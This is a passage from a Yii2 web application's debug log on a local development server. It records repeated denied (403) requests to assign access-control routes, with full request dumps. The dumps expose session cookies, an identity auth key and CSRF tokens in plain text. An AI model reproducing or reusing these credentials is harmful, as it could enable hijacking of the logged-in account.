        113 => '/atletas/asistencia/get-info-escuela'
        114 => '/atletas/asistencia/*'
        115 => '/atletas/atletas-registro/index'
        116 => '/atletas/atletas-registro/view'
        117 => '/atletas/atletas-registro/create'
        118 => '/atletas/atletas-registro/update'
        119 => '/atletas/atletas-registro/delete'
        120 => '/atletas/atletas-registro/calcular-categoria'
        121 => '/atletas/atletas-registro/*'
        122 => '/atletas/default/index'
        123 => '/atletas/default/*'
        124 => '/atletas/*'
        125 => '/escuela_club/*'
        126 => '/ged/default/index'
        127 => '/ged/default/select-escuela'
        128 => '/ged/default/cambiar-escuela'
        129 => '/ged/default/verificar-sesion'
        130 => '/ged/default/reset-sesion'
        131 => '/ged/default/cerrar-escuela'
        132 => '/ged/default/set-school'
        133 => '/ged/default/clear-escuela'
        134 => '/ged/default/debug-mobile'
        135 => '/ged/default/escuela'
        136 => '/ged/default/cambiar-escuela-old'
        137 => '/ged/default/search-schools'
        138 => '/ged/default/buscar-escuelas'
        139 => '/ged/default/*'
        140 => '/ged/*'
        141 => '/aportes/aportes/index'
        142 => '/aportes/aportes/gestion-atleta'
        143 => '/aportes/aportes/view'
        144 => '/aportes/aportes/create'
        145 => '/aportes/aportes/update'
        146 => '/aportes/aportes/delete'
        147 => '/aportes/aportes/marcar-pagado'
        148 => '/aportes/aportes/pago-multiple'
        149 => '/aportes/aportes/pago-adelantado'
        150 => '/aportes/aportes/registro-masivo'
        151 => '/aportes/aportes/compras'
        152 => '/aportes/aportes/reporte-ejecutivo'
        153 => '/aportes/aportes/atletas-morosos'
        154 => '/aportes/aportes/procesar-pago-multiple'
        155 => '/aportes/aportes/procesar-pago-adelantado'
        156 => '/aportes/aportes/obtener-quincenas-pendientes'
        157 => '/aportes/aportes/limpiar-quincenas-anteriores'
        158 => '/aportes/aportes/migrar-datos'
        159 => '/aportes/aportes/*'
        160 => '/aportes/*'
        161 => '/reportes/default/index'
        162 => '/reportes/default/dashboard'
        163 => '/reportes/default/*'
        164 => '/reportes/reportes/atletas'
        165 => '/reportes/reportes/estadisticas-atleta'
        166 => '/reportes/reportes/asistencias'
        167 => '/reportes/reportes/deudas-pendientes'
        168 => '/reportes/reportes/exportar-pdf'
        169 => '/reportes/reportes/exportar-excel'
        170 => '/reportes/reportes/*'
        171 => '/reportes/*'
        172 => '/debug/default/db-explain'
        173 => '/debug/default/index'
        174 => '/debug/default/view'
        175 => '/debug/default/toolbar'
        176 => '/debug/default/download-mail'
        177 => '/debug/default/*'
        178 => '/debug/user/set-identity'
        179 => '/debug/user/reset-identity'
        180 => '/debug/user/*'
        181 => '/debug/*'
        182 => '/gii/default/index'
        183 => '/gii/default/view'
        184 => '/gii/default/preview'
        185 => '/gii/default/diff'
        186 => '/gii/default/action'
        187 => '/gii/default/*'
        188 => '/gii/*'
        189 => '/coordenadas/get-coordenadas-by-vista'
        190 => '/coordenadas/*'
        191 => '/municipio/get-by-edo'
        192 => '/municipio/list'
        193 => '/municipio/*'
        194 => '/parroquia/get-by-muni'
        195 => '/parroquia/get-by-muni-cod'
        196 => '/parroquia/list'
        197 => '/parroquia/*'
        198 => '/perfil/mi-informacion'
        199 => '/perfil/mis-deudas'
        200 => '/perfil/mis-representados'
        201 => '/perfil/*'
        202 => '/site/error'
        203 => '/site/captcha'
        204 => '/site/index'
        205 => '/site/acceder-sistema'
        206 => '/site/login'
        207 => '/site/logout'
        208 => '/site/contact'
        209 => '/site/about'
        210 => '/site/cambiar-password'
        211 => '/site/mi-cuenta'
        212 => '/site/testcss'
        213 => '/site/test-js'
        214 => '/site/check-redirect-loop'
        215 => '/site/get-mobile-menu'
        216 => '/site/debug-menu'
        217 => '/site/test-menu-widget'
        218 => '/site/clear-cache'
        219 => '/site/diagnosticar-menu'
        220 => '/site/reparar-menu'
        221 => '/site/diagnostico-rapido'
        222 => '/site/*'
        223 => '/tasa-dolar/index'
        224 => '/tasa-dolar/actualizar'
        225 => '/tasa-dolar/historial'
        226 => '/tasa-dolar/actualizar-automatico'
        227 => '/tasa-dolar/api-tasa-actual'
        228 => '/tasa-dolar/probar-fuentes'
        229 => '/tasa-dolar/exportar-historial'
        230 => '/tasa-dolar/get-tasa-actual'
        231 => '/tasa-dolar/*'
        232 => '/*'
    ]
]

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'CONTENT_LENGTH' => '9719'
    'HTTP_X_CSRF_TOKEN' => 'LDVun6j-73ZXPXdORwYz1ZJvOrV84XdTjMcZbFrap7peVyT6xpCLOwUOQCcybl6bywdM1iWjEhf0llgbaJLO4A=='
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => '*/*'
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded; charset=UTF-8'
    'HTTP_ORIGIN' => 'http://planealo.local'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58620'
    'REDIRECT_URL' => '/admin/route/assign'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/assign'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629380.34
    'REQUEST_TIME' => 1769629380
]
2026-01-28 15:43:01 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('assign', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ass...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:43:00 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = [
    'routes' => [
        0 => '/admin/assignment/index'
        1 => '/admin/assignment/view'
        2 => '/admin/assignment/assign'
        3 => '/admin/assignment/revoke'
        4 => '/admin/assignment/*'
        5 => '/admin/default/index'
        6 => '/admin/default/*'
        7 => '/admin/menu/index'
        8 => '/admin/menu/view'
        9 => '/admin/menu/create'
        10 => '/admin/menu/update'
        11 => '/admin/menu/delete'
        12 => '/admin/menu/*'
        13 => '/admin/permission/index'
        14 => '/admin/permission/view'
        15 => '/admin/permission/create'
        16 => '/admin/permission/update'
        17 => '/admin/permission/delete'
        18 => '/admin/permission/assign'
        19 => '/admin/permission/get-users'
        20 => '/admin/permission/remove'
        21 => '/admin/permission/*'
        22 => '/admin/role/index'
        23 => '/admin/role/view'
        24 => '/admin/role/create'
        25 => '/admin/role/update'
        26 => '/admin/role/delete'
        27 => '/admin/role/assign'
        28 => '/admin/role/get-users'
        29 => '/admin/role/remove'
        30 => '/admin/role/*'
        31 => '/admin/route/index'
        32 => '/admin/route/create'
        33 => '/admin/route/assign'
        34 => '/admin/route/remove'
        35 => '/admin/route/refresh'
        36 => '/admin/route/*'
        37 => '/admin/rule/index'
        38 => '/admin/rule/view'
        39 => '/admin/rule/create'
        40 => '/admin/rule/update'
        41 => '/admin/rule/delete'
        42 => '/admin/rule/*'
        43 => '/admin/user/index'
        44 => '/admin/user/view'
        45 => '/admin/user/delete'
        46 => '/admin/user/login'
        47 => '/admin/user/logout'
        48 => '/admin/user/signup'
        49 => '/admin/user/request-password-reset'
        50 => '/admin/user/reset-password'
        51 => '/admin/user/change-password'
        52 => '/admin/user/activate'
        53 => '/admin/user/*'
        54 => '/admin/*'
        55 => '/acces/default/index'
        56 => '/acces/default/*'
        57 => '/acces/user/index'
        58 => '/acces/user/view'
        59 => '/acces/user/delete'
        60 => '/acces/user/login'
        61 => '/acces/user/logout'
        62 => '/acces/user/signup'
        63 => '/acces/user/post-by-user'
        64 => '/acces/user/request-password-reset'
        65 => '/acces/user/reset-password'
        66 => '/acces/user/change-password'
        67 => '/acces/user/activate'
        68 => '/acces/user/*'
        69 => '/acces/*'
        70 => '/tienda/default/index'
        71 => '/tienda/default/registro-vendedor'
        72 => '/tienda/default/dashboard-vendedor'
        73 => '/tienda/default/*'
        74 => '/tienda/marketplace/index'
        75 => '/tienda/marketplace/productos'
        76 => '/tienda/marketplace/producto'
        77 => '/tienda/marketplace/tienda'
        78 => '/tienda/marketplace/tiendas'
        79 => '/tienda/marketplace/categoria'
        80 => '/tienda/marketplace/buscar'
        81 => '/tienda/marketplace/*'
        82 => '/tienda/producto/index'
        83 => '/tienda/producto/view'
        84 => '/tienda/producto/create'
        85 => '/tienda/producto/update'
        86 => '/tienda/producto/delete'
        87 => '/tienda/producto/toggle-status'
        88 => '/tienda/producto/toggle-featured'
        89 => '/tienda/producto/manage-stock'
        90 => '/tienda/producto/*'
        91 => '/tienda/tienda/index'
        92 => '/tienda/tienda/view'
        93 => '/tienda/tienda/create'
        94 => '/tienda/tienda/update'
        95 => '/tienda/tienda/delete'
        96 => '/tienda/tienda/toggle-status'
        97 => '/tienda/tienda/dashboard'
        98 => '/tienda/tienda/*'
        99 => '/tienda/*'
        100 => '/atletas/asistencia/index'
        101 => '/atletas/asistencia/view'
        102 => '/atletas/asistencia/create'
        103 => '/atletas/asistencia/registro-rapido'
        104 => '/atletas/asistencia/registrar-rapido'
        105 => '/atletas/asistencia/marcar-salida'
        106 => '/atletas/asistencia/update'
        107 => '/atletas/asistencia/delete'
        108 => '/atletas/asistencia/reporte'
        109 => '/atletas/asistencia/dashboard'
        110 => '/atletas/asistencia/registro-multiple'
        111 => '/atletas/asistencia/get-atletas-by-escuela'
        112 => '/atletas/asistencia/get-asistencias-hoy'
        113 => '/atletas/asistencia/get-info-escuela'
        114 => '/atletas/asistencia/*'
        115 => '/atletas/atletas-registro/index'
        116 => '/atletas/atletas-registro/view'
        117 => '/atletas/atletas-registro/create'
        118 => '/atletas/atletas-registro/update'
        119 => '/atletas/atletas-registro/delete'
        120 => '/atletas/atletas-registro/calcular-categoria'
        121 => '/atletas/atletas-registro/*'
        122 => '/atletas/default/index'
        123 => '/atletas/default/*'
        124 => '/atletas/*'
        125 => '/escuela_club/*'
        126 => '/ged/default/index'
        127 => '/ged/default/select-escuela'
        128 => '/ged/default/cambiar-escuela'
        129 => '/ged/default/verificar-sesion'
        130 => '/ged/default/reset-sesion'
        131 => '/ged/default/cerrar-escuela'
        132 => '/ged/default/set-school'
        133 => '/ged/default/clear-escuela'
        134 => '/ged/default/debug-mobile'
        135 => '/ged/default/escuela'
        136 => '/ged/default/cambiar-escuela-old'
        137 => '/ged/default/search-schools'
        138 => '/ged/default/buscar-escuelas'
        139 => '/ged/default/*'
        140 => '/ged/*'
        141 => '/aportes/aportes/index'
        142 => '/aportes/aportes/gestion-atleta'
        143 => '/aportes/aportes/view'
        144 => '/aportes/aportes/create'
        145 => '/aportes/aportes/update'
        146 => '/aportes/aportes/delete'
        147 => '/aportes/aportes/marcar-pagado'
        148 => '/aportes/aportes/pago-multiple'
        149 => '/aportes/aportes/pago-adelantado'
        150 => '/aportes/aportes/registro-masivo'
        151 => '/aportes/aportes/compras'
        152 => '/aportes/aportes/reporte-ejecutivo'
        153 => '/aportes/aportes/atletas-morosos'
        154 => '/aportes/aportes/procesar-pago-multiple'
        155 => '/aportes/aportes/procesar-pago-adelantado'
        156 => '/aportes/aportes/obtener-quincenas-pendientes'
        157 => '/aportes/aportes/limpiar-quincenas-anteriores'
        158 => '/aportes/aportes/migrar-datos'
        159 => '/aportes/aportes/*'
        160 => '/aportes/*'
        161 => '/reportes/default/index'
        162 => '/reportes/default/dashboard'
        163 => '/reportes/default/*'
        164 => '/reportes/reportes/atletas'
        165 => '/reportes/reportes/estadisticas-atleta'
        166 => '/reportes/reportes/asistencias'
        167 => '/reportes/reportes/deudas-pendientes'
        168 => '/reportes/reportes/exportar-pdf'
        169 => '/reportes/reportes/exportar-excel'
        170 => '/reportes/reportes/*'
        171 => '/reportes/*'
        172 => '/debug/default/db-explain'
        173 => '/debug/default/index'
        174 => '/debug/default/view'
        175 => '/debug/default/toolbar'
        176 => '/debug/default/download-mail'
        177 => '/debug/default/*'
        178 => '/debug/user/set-identity'
        179 => '/debug/user/reset-identity'
        180 => '/debug/user/*'
        181 => '/debug/*'
        182 => '/gii/default/index'
        183 => '/gii/default/view'
        184 => '/gii/default/preview'
        185 => '/gii/default/diff'
        186 => '/gii/default/action'
        187 => '/gii/default/*'
        188 => '/gii/*'
        189 => '/coordenadas/get-coordenadas-by-vista'
        190 => '/coordenadas/*'
        191 => '/municipio/get-by-edo'
        192 => '/municipio/list'
        193 => '/municipio/*'
        194 => '/parroquia/get-by-muni'
        195 => '/parroquia/get-by-muni-cod'
        196 => '/parroquia/list'
        197 => '/parroquia/*'
        198 => '/perfil/mi-informacion'
        199 => '/perfil/mis-deudas'
        200 => '/perfil/mis-representados'
        201 => '/perfil/*'
        202 => '/site/error'
        203 => '/site/captcha'
        204 => '/site/index'
        205 => '/site/acceder-sistema'
        206 => '/site/login'
        207 => '/site/logout'
        208 => '/site/contact'
        209 => '/site/about'
        210 => '/site/cambiar-password'
        211 => '/site/mi-cuenta'
        212 => '/site/testcss'
        213 => '/site/test-js'
        214 => '/site/check-redirect-loop'
        215 => '/site/get-mobile-menu'
        216 => '/site/debug-menu'
        217 => '/site/test-menu-widget'
        218 => '/site/clear-cache'
        219 => '/site/diagnosticar-menu'
        220 => '/site/reparar-menu'
        221 => '/site/diagnostico-rapido'
        222 => '/site/*'
        223 => '/tasa-dolar/index'
        224 => '/tasa-dolar/actualizar'
        225 => '/tasa-dolar/historial'
        226 => '/tasa-dolar/actualizar-automatico'
        227 => '/tasa-dolar/api-tasa-actual'
        228 => '/tasa-dolar/probar-fuentes'
        229 => '/tasa-dolar/exportar-historial'
        230 => '/tasa-dolar/get-tasa-actual'
        231 => '/tasa-dolar/*'
        232 => '/*'
    ]
]

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'CONTENT_LENGTH' => '9719'
    'HTTP_X_CSRF_TOKEN' => 'LDVun6j-73ZXPXdORwYz1ZJvOrV84XdTjMcZbFrap7peVyT6xpCLOwUOQCcybl6bywdM1iWjEhf0llgbaJLO4A=='
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => '*/*'
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded; charset=UTF-8'
    'HTTP_ORIGIN' => 'http://planealo.local'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58622'
    'REDIRECT_URL' => '/admin/route/assign'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/assign'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629380.9155
    'REQUEST_TIME' => 1769629380
]
2026-01-28 15:43:01 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('assign', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ass...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:43:01 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = [
    'routes' => [
        0 => '/admin/assignment/index'
        1 => '/admin/assignment/view'
        2 => '/admin/assignment/assign'
        3 => '/admin/assignment/revoke'
        4 => '/admin/assignment/*'
        5 => '/admin/default/index'
        6 => '/admin/default/*'
        7 => '/admin/menu/index'
        8 => '/admin/menu/view'
        9 => '/admin/menu/create'
        10 => '/admin/menu/update'
        11 => '/admin/menu/delete'
        12 => '/admin/menu/*'
        13 => '/admin/permission/index'
        14 => '/admin/permission/view'
        15 => '/admin/permission/create'
        16 => '/admin/permission/update'
        17 => '/admin/permission/delete'
        18 => '/admin/permission/assign'
        19 => '/admin/permission/get-users'
        20 => '/admin/permission/remove'
        21 => '/admin/permission/*'
        22 => '/admin/role/index'
        23 => '/admin/role/view'
        24 => '/admin/role/create'
        25 => '/admin/role/update'
        26 => '/admin/role/delete'
        27 => '/admin/role/assign'
        28 => '/admin/role/get-users'
        29 => '/admin/role/remove'
        30 => '/admin/role/*'
        31 => '/admin/route/index'
        32 => '/admin/route/create'
        33 => '/admin/route/assign'
        34 => '/admin/route/remove'
        35 => '/admin/route/refresh'
        36 => '/admin/route/*'
        37 => '/admin/rule/index'
        38 => '/admin/rule/view'
        39 => '/admin/rule/create'
        40 => '/admin/rule/update'
        41 => '/admin/rule/delete'
        42 => '/admin/rule/*'
        43 => '/admin/user/index'
        44 => '/admin/user/view'
        45 => '/admin/user/delete'
        46 => '/admin/user/login'
        47 => '/admin/user/logout'
        48 => '/admin/user/signup'
        49 => '/admin/user/request-password-reset'
        50 => '/admin/user/reset-password'
        51 => '/admin/user/change-password'
        52 => '/admin/user/activate'
        53 => '/admin/user/*'
        54 => '/admin/*'
        55 => '/acces/default/index'
        56 => '/acces/default/*'
        57 => '/acces/user/index'
        58 => '/acces/user/view'
        59 => '/acces/user/delete'
        60 => '/acces/user/login'
        61 => '/acces/user/logout'
        62 => '/acces/user/signup'
        63 => '/acces/user/post-by-user'
        64 => '/acces/user/request-password-reset'
        65 => '/acces/user/reset-password'
        66 => '/acces/user/change-password'
        67 => '/acces/user/activate'
        68 => '/acces/user/*'
        69 => '/acces/*'
        70 => '/tienda/default/index'
        71 => '/tienda/default/registro-vendedor'
        72 => '/tienda/default/dashboard-vendedor'
        73 => '/tienda/default/*'
        74 => '/tienda/marketplace/index'
        75 => '/tienda/marketplace/productos'
        76 => '/tienda/marketplace/producto'
        77 => '/tienda/marketplace/tienda'
        78 => '/tienda/marketplace/tiendas'
        79 => '/tienda/marketplace/categoria'
        80 => '/tienda/marketplace/buscar'
        81 => '/tienda/marketplace/*'
        82 => '/tienda/producto/index'
        83 => '/tienda/producto/view'
        84 => '/tienda/producto/create'
        85 => '/tienda/producto/update'
        86 => '/tienda/producto/delete'
        87 => '/tienda/producto/toggle-status'
        88 => '/tienda/producto/toggle-featured'
        89 => '/tienda/producto/manage-stock'
